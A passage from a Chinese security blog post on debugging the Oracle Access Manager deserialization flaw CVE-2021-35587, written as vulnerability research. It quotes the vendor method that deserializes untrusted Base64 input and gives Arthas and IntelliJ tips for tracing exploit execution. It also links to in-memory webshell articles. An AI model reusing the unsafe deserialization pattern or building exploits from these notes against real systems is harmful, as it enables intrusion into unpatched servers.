</span></span></code></pre></td></tr></table></div></div><p>看到unmarshal方法返回的对象信息：</p><p><img loading=lazy src=image-20220707113031957.png alt=image-20220707113031957></p><p>相关代码块：</p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-125-1><a style=outline:none;text-decoration:none;color:inherit href=#hl-125-1> 1</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-125-2><a style=outline:none;text-decoration:none;color:inherit href=#hl-125-2> 2</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-125-3><a style=outline:none;text-decoration:none;color:inherit href=#hl-125-3> 3</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-125-4><a style=outline:none;text-decoration:none;color:inherit href=#hl-125-4> 4</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-125-5><a style=outline:none;text-decoration:none;color:inherit href=#hl-125-5> 5</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-125-6><a style=outline:none;text-decoration:none;color:inherit href=#hl-125-6> 6</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-125-7><a style=outline:none;text-decoration:none;color:inherit href=#hl-125-7> 7</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-125-8><a style=outline:none;text-decoration:none;color:inherit href=#hl-125-8> 8</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-125-9><a style=outline:none;text-decoration:none;color:inherit href=#hl-125-9> 9</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-125-10><a style=outline:none;text-decoration:none;color:inherit href=#hl-125-10>10</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-125-11><a style=outline:none;text-decoration:none;color:inherit href=#hl-125-11>11</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-125-12><a style=outline:none;text-decoration:none;color:inherit href=#hl-125-12>12</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-125-13><a style=outline:none;text-decoration:none;color:inherit href=#hl-125-13>13</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-125-14><a style=outline:none;text-decoration:none;color:inherit href=#hl-125-14>14</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-125-15><a style=outline:none;text-decoration:none;color:inherit href=#hl-125-15>15</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-125-16><a style=outline:none;text-decoration:none;color:inherit href=#hl-125-16>16</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-125-17><a style=outline:none;text-decoration:none;color:inherit href=#hl-125-17>17</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-125-18><a style=outline:none;text-decoration:none;color:inherit href=#hl-125-18>18</a>
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-java data-lang=java><span style=display:flex><span><span style=color:#75715e>// oracle.security.am.proxy.opensso.controller.OpenssoEngineController#unmarshal
</span></span></span><span style=display:flex><span><span style=color:#75715e></span><span style=color:#66d9ef>private</span> Object <span style=color:#a6e22e>unmarshal</span><span style=color:#f92672>(</span>String requester<span style=color:#f92672>)</span> <span style=color:#66d9ef>throws</span> Exception <span style=color:#f92672>{</span>
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>if</span> <span style=color:#f92672>(</span>requester<span style=color:#f92672>.</span><span style=color:#a6e22e>startsWith</span><span style=color:#f92672>(</span><span style=color:#e6db74>&#34;token:&#34;</span><span style=color:#f92672>))</span> <span style=color:#f92672>{</span>
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>return</span> <span style=color:#66d9ef>this</span><span style=color:#f92672>.</span><span style=color:#a6e22e>createSessionID</span><span style=color:#f92672>(</span>requester<span style=color:#f92672>.</span><span style=color:#a6e22e>substring</span><span style=color:#f92672>(</span><span style=color:#e6db74>&#34;token:&#34;</span><span style=color:#f92672>.</span><span style=color:#a6e22e>length</span><span style=color:#f92672>()));</span>
</span></span><span style=display:flex><span>        <span style=color:#f92672>}</span> <span style=color:#66d9ef>else</span> <span style=color:#66d9ef>if</span> <span style=color:#f92672>(</span>requester<span style=color:#f92672>.</span><span style=color:#a6e22e>startsWith</span><span style=color:#f92672>(</span><span style=color:#e6db74>&#34;object:&#34;</span><span style=color:#f92672>))</span> <span style=color:#f92672>{</span>
</span></span><span style=display:flex><span>            ObjectInputStream is <span style=color:#f92672>=</span> <span style=color:#66d9ef>null</span><span style=color:#f92672>;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>try</span> <span style=color:#f92672>{</span>
</span></span><span style=display:flex><span>                is <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> ObjectInputStream<span style=color:#f92672>(</span><span style=color:#66d9ef>new</span> ByteArrayInputStream<span style=color:#f92672>(</span>Base64<span style=color:#f92672>.</span><span style=color:#a6e22e>decode</span><span style=color:#f92672>(</span>requester<span style=color:#f92672>.</span><span style=color:#a6e22e>substring</span><span style=color:#f92672>(</span><span style=color:#e6db74>&#34;object:&#34;</span><span style=color:#f92672>.</span><span style=color:#a6e22e>length</span><span style=color:#f92672>()))));</span>
</span></span><span style=display:flex><span>            <span style=color:#f92672>}</span> <span style=color:#66d9ef>catch</span> <span style=color:#f92672>(</span>IOException var4<span style=color:#f92672>)</span> <span style=color:#f92672>{</span>
</span></span><span style=display:flex><span>                LOGGER<span style=color:#f92672>.</span><span style=color:#a6e22e>log</span><span style=color:#f92672>(</span>Level<span style=color:#f92672>.</span><span style=color:#a6e22e>WARNING</span><span style=color:#f92672>,</span> <span style=color:#e6db74>&#34;Error in unmarshalling requester&#34;</span><span style=color:#f92672>,</span> var4<span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>            <span style=color:#f92672>}</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>return</span> is<span style=color:#f92672>.</span><span style=color:#a6e22e>readObject</span><span style=color:#f92672>();</span>
</span></span><span style=display:flex><span>        <span style=color:#f92672>}</span> <span style=color:#66d9ef>else</span> <span style=color:#f92672>{</span>
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>throw</span> <span style=color:#66d9ef>new</span> IllegalArgumentException<span style=color:#f92672>(</span><span style=color:#e6db74>&#34;Bad context value:&#34;</span> <span style=color:#f92672>+</span> requester<span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>        <span style=color:#f92672>}</span>
</span></span><span style=display:flex><span>    <span style=color:#f92672>}</span>
</span></span></code></pre></td></tr></table></div></div><p>此外，如果需要观察 <code>java.*</code> 下的类，要先打开安全开关。比如查看从序列化数据中提取出来的类名：</p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-126-1><a style=outline:none;text-decoration:none;color:inherit href=#hl-126-1>1</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-126-2><a style=outline:none;text-decoration:none;color:inherit href=#hl-126-2>2</a>
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>options unsafe true
</span></span><span style=display:flex><span>watch java.io.ObjectInputStream readClassDesc returnObj
</span></span></code></pre></td></tr></table></div></div><p><img loading=lazy src=image-20220707114454253.png alt=image-20220707114454253></p><h2 id=为何有时挂上调试后应用卡死>为何有时挂上调试后应用卡死？<a hidden class=anchor aria-hidden=true href=#为何有时挂上调试后应用卡死>#</a></h2><p>有时候idea挂到webapp上面调试的时候，用burp发包，很久都没有响应，idea也没有捕获到断点。但如果把所有断点都失效，burp就马上有响应了。</p><p>这种情况可能是因为有断点下在了Java method中（即java.*下的代码），导致断点太经常被触发了。Idea在第一次下这种断点的时候也会有提示：<code>Method breakpoints may dramatically slow down debugging</code> 。</p><p>解决办法是把Java Method Breakpoints这类断点都先deactivate，先在java line breakpoint里面下断，跑起来断下来以后，再开启Javamethod breakpoints里面的断点。</p><p><img loading=lazy src=image-20220324000143091.png alt=image-20220324000143091></p><h2 id=调试时无法进入java包中的代码>调试时无法进入java.*包中的代码？<a hidden class=anchor aria-hidden=true href=#调试时无法进入java包中的代码>#</a></h2><p>如果调试进不去readOBject，需要在idea的debugger设置中去除不进入java.io.*类的选项。</p><p><img loading=lazy src=image-20220630161455653.png alt=image-20220630161455653></p><h2 id=arthas附到java进程后idea调试出问题>arthas附到Java进程后idea调试出问题<a hidden class=anchor aria-hidden=true href=#arthas附到java进程后idea调试出问题>#</a></h2><p>如果idea调试会出现各种奇怪的难以理解的问题，可以查看java web的日志看是否和arthas有关，可能是由于arthas在watch某些地方导致的，这时可以尝试先退出arthas，再调试。</p><p><img loading=lazy src=image-20220707164507561.png alt=image-20220707164507561></p><h2 id=下断点显示灰色怎么办>下断点显示灰色怎么办？<a hidden class=anchor aria-hidden=true href=#下断点显示灰色怎么办>#</a></h2><p>下断点显示灰色，提示 &ldquo;no executable code found at line 46 in class java.io.ObjectOutputStream&rdquo; 。</p><p><img loading=lazy src=image-20220630161853774.png alt=image-20220630161853774></p><p><img loading=lazy src=image-20220630161858107.png alt=image-20220630161858107></p><p>原因是idea中使用的JDK版本和远程服务器上使用的JDK版本不同导致源码行数对不上，比如在我的环境中，在oamms server中使用的是1.8.0_281，idea中使用的是1.8.0_333。</p><p><img loading=lazy src=image-20220630162229668.png alt=image-20220630162229668></p><p><img loading=lazy src=image-20220630162253405.png alt=image-20220630162253405></p><p>去下载完全相同的版本，从https://www.oracle.com/java/technologies/downloads/archive/</p><p><img loading=lazy src=image-20220630164451670.png alt=image-20220630164451670></p><p>进到 <a href=https://www.oracle.com/java/technologies/javase/javase8u211-later-archive-downloads.html>https://www.oracle.com/java/technologies/javase/javase8u211-later-archive-downloads.html</a></p><p><img loading=lazy src=image-20220630164535064.png alt=image-20220630164535064></p><p>下载jdk-8u281-linux-x64.tar.gz压缩包，在idea中加载JDK，然后就可以了。</p><h2 id=关闭smart-step-into>关闭smart step into<a hidden class=anchor aria-hidden=true href=#关闭smart-step-into>#</a></h2><p>有时idea会自动跳过某些代码，我们可以关闭smart step into让它如实执行指令。</p><p><img loading=lazy src=image-20220630225616330.png alt=image-20220630225616330></p><h2 id=比较字节流>比较字节流<a hidden class=anchor aria-hidden=true href=#比较字节流>#</a></h2><p>有时需要比较两个字节流是否完全一致，可以使用MD5值来比较</p><p>在idae的evaluate功能中执行。（快捷键：alt+f8）</p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-127-1><a style=outline:none;text-decoration:none;color:inherit href=#hl-127-1>1</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-127-2><a style=outline:none;text-decoration:none;color:inherit href=#hl-127-2>2</a>
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-java data-lang=java><span style=display:flex><span><span style=color:#66d9ef>new</span> java<span style=color:#f92672>.</span><span style=color:#a6e22e>math</span><span style=color:#f92672>.</span><span style=color:#a6e22e>BigInteger</span><span style=color:#f92672>(</span><span style=color:#ae81ff>1</span><span style=color:#f92672>,</span>java<span style=color:#f92672>.</span><span style=color:#a6e22e>security</span><span style=color:#f92672>.</span><span style=color:#a6e22e>MessageDigest</span><span style=color:#f92672>.</span><span style=color:#a6e22e>getInstance</span><span style=color:#f92672>(</span><span style=color:#e6db74>&#34;MD5&#34;</span><span style=color:#f92672>).</span><span style=color:#a6e22e>digest</span><span style=color:#f92672>(</span>constructor<span style=color:#f92672>.</span><span style=color:#a6e22e>m_definition</span><span style=color:#f92672>.</span><span style=color:#a6e22e>m_abClass</span><span style=color:#f92672>)).</span><span style=color:#a6e22e>toString</span><span style=color:#f92672>(</span><span style=color:#ae81ff>16</span><span style=color:#f92672>)</span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>new</span> java<span style=color:#f92672>.</span><span style=color:#a6e22e>math</span><span style=color:#f92672>.</span><span style=color:#a6e22e>BigInteger</span><span style=color:#f92672>(</span><span style=color:#ae81ff>1</span><span style=color:#f92672>,</span>java<span style=color:#f92672>.</span><span style=color:#a6e22e>security</span><span style=color:#f92672>.</span><span style=color:#a6e22e>MessageDigest</span><span style=color:#f92672>.</span><span style=color:#a6e22e>getInstance</span><span style=color:#f92672>(</span><span style=color:#e6db74>&#34;MD5&#34;</span><span style=color:#f92672>).</span><span style=color:#a6e22e>digest</span><span style=color:#f92672>(</span>abClass<span style=color:#f92672>)).</span><span style=color:#a6e22e>toString</span><span style=color:#f92672>(</span><span style=color:#ae81ff>16</span><span style=color:#f92672>)</span>
</span></span></code></pre></td></tr></table></div></div><h2 id=能从jvm卸载一个类加载一个类的新版本吗>能从jvm卸载一个类/加载一个类的新版本吗？<a hidden class=anchor aria-hidden=true href=#能从jvm卸载一个类加载一个类的新版本吗>#</a></h2><p>不行。参考：</p><blockquote><p>There is no way to force1 a class to unload. And unless the old class is unloaded, there is no way to load a new version of a class into the same classloader. (That is because the true identity of a class is a tuple comprising the fully qualified name of the class and the class loader identity.)</p><p>The solution is to load the new version of the class in a new classloader.</p><p>It is not clear if this will be practical for you, but unfortunately it is the only option available. The JVM does the &ldquo;duplicate class definition&rdquo; checks in a way that you can&rsquo;t subvert it. The check has security and JVM stability implications.</p><p>——https://stackoverflow.com/questions/34414906/classloading-using-different-versions-of-the-same-class-java-lang-linkageerror</p></blockquote><h2 id=如何知道恶意代码是否被执行了>如何知道恶意代码是否被执行了？<a hidden class=anchor aria-hidden=true href=#如何知道恶意代码是否被执行了>#</a></h2><p>最开始想的是在oamms中新建文件 <code>/tmp/cve/12345.sh</code> ，在序列化静态方法中执行这个文件，然后监控access time，如果改动，说明调用到了命令。</p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-128-1><a style=outline:none;text-decoration:none;color:inherit href=#hl-128-1>1</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-128-2><a style=outline:none;text-decoration:none;color:inherit href=#hl-128-2>2</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-128-3><a style=outline:none;text-decoration:none;color:inherit href=#hl-128-3>3</a>
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>root@ubuntu:~# docker exec -it oamms bash -c <span style=color:#e6db74>&#34;stat /tmp/cve/12345.sh&#34;</span> |grep <span style=color:#e6db74>&#34;Access: 2022&#34;</span> &gt;&gt; /tmp/touchflag.time
</span></span><span style=display:flex><span>root@ubuntu:~# cat /tmp/touchflag.time 
</span></span><span style=display:flex><span>Access: 2022-06-30 03:28:06.663982304 +0000
</span></span></code></pre></td></tr></table></div></div><p>但实际上这是个坑，Java代码执行到这个文件也不会改变stat。</p><p>最好是挂上调试，下合适的断点，执行流是否走到我们关心的地方就一清二楚了。</p><p>在最终的恶意代码中弹计算器，然后把断点下在 <code>java.lang.Runtime#exec(java.lang.String)</code> 或者 <code>java.lang.Runtime#getRuntime()</code> ，可以非常清楚知道静态代码有没有被成功执行，还能非常清晰地打出整个过程的调用栈。</p><p><img loading=lazy src=image-20220630233819085.png alt=image-20220630233819085></p><p>java.lang.Runtime#exec(java.lang.String)</p><p><img loading=lazy src=image-20220630234020774.png alt=image-20220630234020774></p><h2 id=如何保持良好的心态>如何保持良好的心态？<a hidden class=anchor aria-hidden=true href=#如何保持良好的心态>#</a></h2><ul><li>不要愤怒，不要着急，在计算机世界里面，如果哪里出错了，那么一定是你出错了，不会是计算机。</li></ul><h2 id=遗留问题如何跟踪native调用的进出>遗留问题：如何跟踪native调用的进出？<a hidden class=anchor aria-hidden=true href=#遗留问题如何跟踪native调用的进出>#</a></h2><p>在进入defineClass的rabbit hole 的时候，我意识到，有些地方，如果没有下断点，是会直接跳过的，F7也没有用，关闭idea的smart step into也没有用。比如native函数defineClass1跳出来到transform，又跳回去，然后又出来到RemotableSupport对象的loadClass方法，如果不是我根据错误堆栈在这里下断点，就会直接跳走，我就不会观察到这个现象。又有多少因为我没有下断点而无法观察到的过程呢？怎么解决这个问题，只有解决了这个问题，才能完整跟踪到native函数回调了哪些java层的函数。</p><p>也就是说，动态调试时，当执行流进入native调用就容易跟丢，native调用时还可能在Java和native之间反复跳转，如果没有合适的断点，就会错过很多逻辑，是否有什么方式可以监控native调用的进出点，精准地监视跳转边界，完整地观察到native层调用过程和Java层的交互。还没有找到有效的办法，如果有好主意请联系我。</p><h1 id=扩展阅读>扩展阅读<a hidden class=anchor aria-hidden=true href=#扩展阅读>#</a></h1><ul><li>arthas<ul><li><a href=https://arthas.aliyun.com/doc/en/quick-start.html>https://arthas.aliyun.com/doc/en/quick-start.html</a></li></ul></li><li>内存马<ul><li><a href=https://www.cnblogs.com/bitterz/p/14970230.html>Weblogic下的servlet内存马注入-无参照纯调试</a></li><li><a href=https://myzxcg.com/2021/11/Weblogic-%E5%86%85%E5%AD%98%E9%A9%AC%E5%88%86%E6%9E%90%E4%B8%8E%E5%AE%9E%E7%8E%B0/#%E8%8E%B7%E5%8F%96webappservletcontext>Weblogic-内存马分析与实现</a></li><li><a href=https://www.xuxblog.top/archives/java-dong-tai-jia-zai-zi-jie-ma-de-fang-fa>Java动态加载字节码的方法</a></li></ul></li><li>安装Oracle Access Manager<ul><li><a href=https://docs.oracle.com/en/middleware/idm/access-manager/12.2.1.4/tutorial-oam-docker/>Creating Oracle Access Management Docker Containers</a></li><li><a href=https://www.oracle.com/hk/security/identity-management/technologies/downloads/>https://www.oracle.com/hk/security/identity-management/technologies/downloads/</a></li><li><a href=https://docs.oracle.com/cd/E23104_01/download_readme.htm>https://docs.oracle.com/cd/E23104_01/download_readme.htm</a></li><li><a href=https://github.com/oracle/docker-images/tree/main/OracleAccessManagement>https://github.com/oracle/docker-images/tree/main/OracleAccessManagement</a></li><li>oracle虚拟环境：https://www.oracle.com/virtualization/technologies/virtual-appliances.html</li></ul></li><li>CDB与PDB<ul><li><a href=https://www.cnblogs.com/kerrycode/p/3386917.html>ORACLE 12C新特性——CDB与PDB</a></li><li><a href=https://www.dell.com/support/kbdoc/zh-cn/000146485/%E5%A6%82%E4%BD%95%E8%BF%9E%E6%8E%A5%E5%88%B0-oracle-rac-12cr1-%E4%B8%AD%E7%9A%84%E5%8F%AF%E6%8F%92%E6%8B%94%E6%95%B0%E6%8D%AE%E5%BA%93>如何连接到 Oracle RAC 12cR1 中的可插拔数据库？</a></li></ul></li><li>SQLPLus<ul><li><a href=https://askubuntu.com/questions/159939/how-to-install-sqlplus>How to install SqlPlus?</a></li><li><a href=https://www.oracle.com/database/technologies/instant-client/linux-x86-64-downloads.html>Oracle Instant Client Downloads for Linux x86-64 (64-bit)</a></li></ul></li><li>Oracle数据库<ul><li><a href=https://hub.docker.com/u/findneo/content/sub-3762ef81-7448-4275-909b-df7e6b5d4070>Oracle Database Server Docker Image Documentation</a></li></ul></li><li>漏洞分析<ul><li><a href=https://twitter.com/testanull/status/1501567794022092805>https://twitter.com/testanull/status/1501567794022092805</a></li><li><a href=https://testbnull.medium.com/oracle-access-manager-pre-auth-rce-cve-2021-35587-analysis-1302a4542316>漏洞作者的分析文章</a></li><li><a href=https://mp.weixin.qq.com/s/nRZWYxUZRKeOX5hebRc7-Q>【最新漏洞预警】CVE-2021–35587 Oracle Access Manager反序列化漏洞分析与命令回显构造</a></li><li><a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-35587">https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-35587</a></li></ul></li></ul></div><footer class=post-footer><ul class=post-tags></ul><nav class=paginav><a class=prev href=https://ret2neo.cn/post/220914-howto-name-tools/><span class=title>« Prev</span><br><span>自研小工具如何命名</span></a>
<a class=next href=https://ret2neo.cn/post/220317-howto-install-oracle-access-manager/><span class=title>Next »</span><br><span>如何搭建 Oracle Access Manager</span></a></nav></footer></article></main><footer class=footer><span>&copy; 2025 <a href=https://ret2neo.cn/>闲言语</a></span>
<span>Powered by
<a href=https://gohugo.io/ rel="noopener noreferrer" target=_blank>Hugo</a> &
        <a href=https://github.com/adityatelange/hugo-PaperMod/ rel=noopener target=_blank>PaperMod</a></span></footer><a href=#top aria-label="go to top" title="Go to Top (Alt + G)" class=top-link id=top-link accesskey=g><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentcolor"><path d="M12 6H0l6-6z"/></svg></a><script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-2303473689051162" crossorigin=anonymous></script><script>let menu=document.getElementById("menu");menu&&(menu.scrollLeft=localStorage.getItem("menu-scroll-position"),menu.onscroll=function(){localStorage.setItem("menu-scroll-position",menu.scrollLeft)}),document.querySelectorAll('a[href^="#"]').forEach(e=>{e.addEventListener("click",function(e){e.preventDefault();var t=this.getAttribute("href").substr(1);window.matchMedia("(prefers-reduced-motion: reduce)").matches?document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView():document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView({behavior:"smooth"}),t==="top"?history.replaceState(null,null," "):history.pushState(null,null,`#${t}`)})})</script><script>var mybutton=document.getElementById("top-link");window.onscroll=function(){document.body.scrollTop>800||document.documentElement.scrollTop>800?(mybutton.style.visibility="visible",mybutton.style.opacity="1"):(mybutton.style.visibility="hidden",mybutton.style.opacity="0")}</script><script>document.getElementById("theme-toggle").addEventListener("click",()=>{document.body.className.includes("dark")?(document.body.classList.remove("dark"),localStorage.setItem("pref-theme","light")):(document.body.classList.add("dark"),localStorage.setItem("pref-theme","dark"))})</script><script>document.querySelectorAll("pre > code").forEach(e=>{const n=e.parentNode.parentNode,t=document.createElement("button");t.classList.add("copy-code"),t.innerHTML="copy";function s(){t.innerHTML="copied!",setTimeout(()=>{t.innerHTML="copy"},2e3)}t.addEventListener("click",t=>{if("clipboard"in navigator){navigator.clipboard.writeText(e.textContent),s();return}const n=document.createRange();n.selectNodeContents(e);const o=window.getSelection();o.removeAllRanges(),o.addRange(n);try{document.execCommand("copy"),s()}catch{}o.removeRange(n)}),n.classList.contains("highlight")?n.appendChild(t):n.parentNode.firstChild==n||(e.parentNode.parentNode.parentNode.parentNode.parentNode.nodeName=="TABLE"?e.parentNode.parentNode.parentNode.parentNode.parentNode.appendChild(t):e.parentNode.appendChild(t))})</script></body></html>